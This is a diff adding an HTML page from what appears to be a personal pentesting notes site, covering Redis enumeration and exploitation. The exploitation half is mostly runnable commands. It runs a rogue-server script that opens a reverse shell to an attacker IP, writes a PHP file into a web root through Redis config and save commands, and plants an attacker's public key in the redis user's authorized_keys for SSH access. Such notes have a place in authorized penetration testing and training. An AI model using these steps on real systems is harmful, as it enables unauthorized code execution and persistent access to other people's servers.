@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>Redis (TCP/6379)</h1>
+            <p>Open-source, in-memory data structure store used primarily as a blazing-fast database, cache, and message broker</p>
+        </div>
+        <div class="notion-body">
+            <ul>
+                <h2>Enumeration</h2>
+                <ul>
+                    <h3>Login</h3>
+                    <ul>
+                        <p>Using the following tool we could be able to connect to the redis instance</p>
+                        <pre><code class="language-bash">redis-cli -h 10.10.10.10</code></pre>
+                        <p>In case it returns something like... means you need valid credentials</p>
+                        <pre><code class="language-bash">-NOAUTH Authentication required.</code></pre>
+                        <p>This ones can be provided once you are connected</p>
+                        <pre><code class="language-bash">AUTH USERNAME PASSWORD</code></pre>
+                    </ul>
+
+                    <h3>Gathering data</h3>
+                    <ul>
+                    <p>Once you are inside there are some useful commands which we can use in order to obtain information about the instance with the command:</p>
+                    <pre><code class="language-bash">info</code></pre>
+                    
+                    <p>Another thing we can do is listing the <b>keyspaces</b> At the end of the output of the last command or with the use of <b>INFO keyspace</b> we will find the keyspaces. It looks like</p>
+                    <pre><code class="language-bash"># Keyspace
+db0:keys=1,expires=0,avg_ttl=0</code></pre>      
+                    <p>In this example there is only one database <b>(db0)</b> and there is only one key <b>(keys=1)</b></p>
+                    <p>We can select the database using</p>
+                    <pre><code class="language-bash">SELECT 0</code></pre>
+                    <p>And then dump the keys using</p>
+                    <pre><code class="language-bash">KEYS *</code></pre>
+                    <p>In case we would like to list the content of an specific key we just need to</p>
+                    <pre><code class="language-bash">GET KEY_NAME</code></pre>
+                    </ul>
+                    <p></p>   
+                </ul>
+
+                <h2>Exploitation</h2>
+                <ul>
+                    <p>There are several ways to obtain RCE through redis and more information can be found <a class="notion-link" href="https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html?highlight=redis#redis-rce">here</a></p>
+
+                    <h3>Interactive shell</h3>
+                    <ul>
+                        <b>This method may not work properly even if you have a compatible version</b>
+                        <p>Using the following script we can automatically get an interactive shell or a reverse shell in Redis(<=5.0.5). <a class="notion-link" href="https://github.com/n0b0dyCN/redis-rogue-server"> redis-rogue-server</a></p>
+                        <pre><code class="language-bash">./redis-rogue-server.py --rhost TARGET_IP --lhost ACCACKER_IP ACCACKER_IP</code></pre>
+                    </ul>
+                    
+                    <h3>PHP webshell</h3>
+                    <ul>
+                        <p>Knowing the local path of the webserver we could be able to write malicious files in the affected server</p>
+                        <pre><code class="language-bash">root@Urahara:~# redis-cli -h 10.85.0.52
+10.85.0.52:6379> config set dir /usr/share/nginx/html
+OK
+10.85.0.52:6379> config set dbfilename redis.php
+OK
+10.85.0.52:6379> set test "<?php phpinfo(); ?>"
+OK
+10.85.0.52:6379> save
+OK</code></pre>
+                       <p>Now browse for the file in the webserver and enjoy the RCE :)</p>     
+                    </ul>
+
+                    <h3>SSH</h3>
+                    <ul>
+                        <p>This method consists in adding your public key in the authorized_keys of the target machine so that way we can perform an ssh login using the user redis</p>
+                        <p>First we need to find the home of the redis user which is usually <b>/var/lib/redis or /home/redis/.ssh</b> the key here is to find the home of a user where we can write in the .ssh folder. If we know another one it will work as well</p>
+                        <p>Generate a ssh public-private key par on your attacker machine</p>
+                        <pre><code class="language-bash">ssh-keygen -t rsa</code></pre>
+                        <p>Write the public key to a file</p>
+                        <pre><code class="language-bash">(echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt</code></pre>
+                        <p>Import the file into redis</p>
+                        <pre><code class="language-bash">cat spaced_key.txt | redis-cli -h TARGET_IP -x set id_rsa.pub</code></pre>
+                        <p>Save ther public key to the authorized_keys file on the redes server</p>
+                        <pre><code class="language-bash">redis-cli -h 10.85.0.52
+10.85.0.52:6379> config set dir /var/lib/redis/.ssh
+OK
+10.85.0.52:6379> config set dbfilename "authorized_keys"
+OK
+10.85.0.52:6379> save
+OK</code></pre>
+                        <p>Finally if everything worked as expected your public key shoudl be inside the file of authorized_keys and then you could be able to ssh as redis</p>            
+                        <pre><code class="language-bash">ssh -i id_rsa redis@10.85.0.52</code></pre>
+                    </ul>
+                </ul>
+                
+            </ul>
+        </div>
+    </div>
+</body>
+</html>
